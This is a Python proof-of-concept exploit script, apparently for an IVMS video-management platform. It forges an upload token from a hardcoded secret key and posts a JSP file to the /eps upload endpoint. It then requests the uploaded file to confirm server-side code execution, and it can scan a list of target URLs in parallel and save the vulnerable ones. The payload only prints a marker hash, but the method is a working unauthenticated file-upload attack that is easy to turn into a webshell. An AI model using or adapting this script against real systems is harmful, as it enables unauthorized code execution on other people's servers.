import hashlib
import os
import time
from urllib import response
from urllib.parse import urljoin
from weakref import proxy
import requests
from threading import Lock
from concurrent.futures import ThreadPoolExecutor
from argparse import ArgumentParser
import re
from colorama import init
from colorama import Fore
init(autoreset=True)

requests.packages.urllib3.disable_warnings()

class POC:
    def __init__(self):
        self.banner()
        self.args = self.parseArgs()

        if self.args.file:
            self.init()
            self.urlList = self.loadURL()  
            self.multiRun()
            self.start = time.time()
        else:
            self.verfyurl()  
    
    def banner(self):
        logo = r"""
._______   _________    _________         ___________________ ___________
|   \   \ /   /     \  /   _____/         \______   \_   ___ \\_   _____/
|   |\   Y   /  \ /  \ \_____  \   ______  |       _/    \  \/ |    __)_ 
|   | \     /    Y    \/        \ /_____/  |    |   \     \____|        \
|___|  \___/\____|__  /_______  /          |____|_  /\______  /_______  /
                    \/        \/                  \/        \/        \/                                                                                                 
                                                                author： Khaz
                                                                GitHub： https://github.com/Khaz                
        """
        print("\033[91m" + logo + "\033[0m")

    def parseArgs(self):
        date = time.strftime("%Y-%m-%d_%H-%M-%S", time.localtime())
        parser = ArgumentParser()
        parser.add_argument("-u", "--url", required=False, type=str, help="Target url(e.g. http://127.0.0.1)")
        parser.add_argument("-f", "--file", required=False, type=str, help=f"Target file(e.g. url.txt)")
        parser.add_argument("-t", "--thread", required=False, type=int, default=5, help=f"Number of thread (default 5)")
        parser.add_argument("-T", "--timeout", required=False, type=int, default=3,  help="Request timeout (default 3)")
        parser.add_argument("-o", "--output", required=False, type=str, default=date,  help=f"Vuln url output file (e.g. result.txt)")
        parser.add_argument("-p", "--proxy", default=None, help="Request Proxy (e.g http://127.0.0.1:8080)")
        return parser.parse_args()
    
    def proxy_server(self):
        proxy = self.args.proxy
        return proxy

    def init(self):
        print("\nthread:", self.args.thread)
        print("timeout:", self.args.timeout)
        msg = ""
        if os.path.isfile(self.args.file):
            msg += "Load url file successfully\n"
        else:
            msg += f"\033[31mLoad url file {self.args.file} failed\033[0m\n"
        print(msg)
        if "failed" in msg:
            print("Init failed, Please check the environment.")
            os._exit(0)
        print("Init successfully")


    def getToken(url,path):
        encodetext = urljoin(url, path)
        input_name = hashlib.md5()
        input_name.update(encodetext.encode("utf-8"))
        return (input_name.hexdigest()).upper()

    def respose(self, url):
        proxy = self.args.proxy
        proxies = None
        if proxy:
            proxies = {"http": proxy, "https": proxy}
        path = "/eps/api/resourceOperations/upload?token="

        encodetext = urljoin(url,"/eps/api/resourceOperations/uploadsecretKeyIbuilding")
        input_name = hashlib.md5()
        input_name.update(encodetext.encode("utf-8"))
        token = (input_name.hexdigest()).upper()

        url = urljoin(url, path)+token
        headers = {
            "Content-Type": "multipart/form-data;boundary=----WebKitFormBoundaryGEJwiloiPo",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36",
            "Cookie": "ISMS_8700_Sessionname=ABCB193BD9D82CC2D6094F6ED4D81169"
        }
        data = '------WebKitFormBoundaryGEJwiloiPo\nContent-Disposition: form-data; name="fileUploader";filename="1.jsp"\r\nContent-Type: image/jpeg\r\n\r\n<%out.println(new String(new sun.misc.BASE64Decoder().decodeBuffer("M2NiYmJmOGJkNjU4MGMyMDBhZTRhYTc2YjliZWIxZjM=")));new java.io.File(application.getRealPath(request.getServletPath())).delete();%>\r\n------WebKitFormBoundaryGEJwiloiPo'
        try:
            response = requests.post(url, headers=headers, data=data, proxies=proxies, timeout=self.args.timeout, verify=False)
            
            pattern = r'"resourceUuid":"([a-z0-9]+)"'
            match = re.search(pattern, response.text)
            try:
                resourceUuid = match.group(1)
                path2 = f"/eps/upload/{resourceUuid}.jsp"
                header = {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",        
            }
                resurl = urljoin(url, path2)
                response2 = requests.get(resurl, headers=header, proxies=proxies, timeout=self.args.timeout, verify=False)            
                resp = response2.text
                return resp  
            except:
                resourceUuid=''
                return response.text
        except:
            return "conn"  

    def verfyurl(self):
        url = self.args.url
        repData = self.respose(url)
        if "3cbbbf8bd6580c200ae4aa76b9beb1f3" in repData:
            print(Fore.GREEN +"[+] 漏洞存在！！！[+] url: {}".format(url))        
        elif "conn" in repData:
            print("[-] URL连接失败！ [-] url: {}".format(url))
        else:
            print("[x] 未检测到漏洞！[x] url: {}".format(url))


    def verify(self, url):
        repData = self.respose(url)
        if "3cbbbf8bd6580c200ae4aa76b9beb1f3" in repData:
            msg = Fore.GREEN + "[+] 漏洞存在！！！[+] url: {}".format(url)
            self.lock.acquire()
            try:
                self.findCount +=1
                self.vulnRULList.append(url)
            finally:
                self.lock.release()
        elif "conn" in repData:
            msg = "[-] URL连接失败！ [-] url: {}".format(url)
        else:
            msg = "[x] 未检测到漏洞！[x] url: {}".format(url)
        self.lock.acquire()
        try:
            print(msg)
        finally:
            self.lock.release()
       

    def loadURL(self):
        urlList = []
        with open(self.args.file, encoding="utf8") as f:
            for u in f.readlines():
                u = u.strip()
                urlList.append(u)
        return urlList
        
    def multiRun(self):
        self.findCount = 0
        self.vulnRULList = []
        self.lock = Lock()
        executor = ThreadPoolExecutor(max_workers=self.args.thread)
        if self.args.url:
            executor.map(self.verify, self.url)
        else:
            executor.map(self.verify, self.urlList)

    def output(self):
        if not os.path.isdir(r"./output"):
            os.mkdir(r"./output")
        self.outputFile = f"./output/{self.args.output}.txt"
        with open(self.outputFile, "a") as f:
            for url in self.vulnRULList:
                f.write(url + "\n")

    def __del__(self):
        try:
            print("\nAlltCount：\033[31m%d\033[0m\nVulnCount：\033[32m%d\033[0m" % (len(self.urlList), self.findCount))
            self.end = time.time()
            print("Time Spent: %.2f" % (self.end - self.start))
            self.output()
            print("-" * 20, f"\nThe vulnURL has been saved in {self.outputFile}\n")
        except:
            pass

if __name__ == "__main__":
    POC()
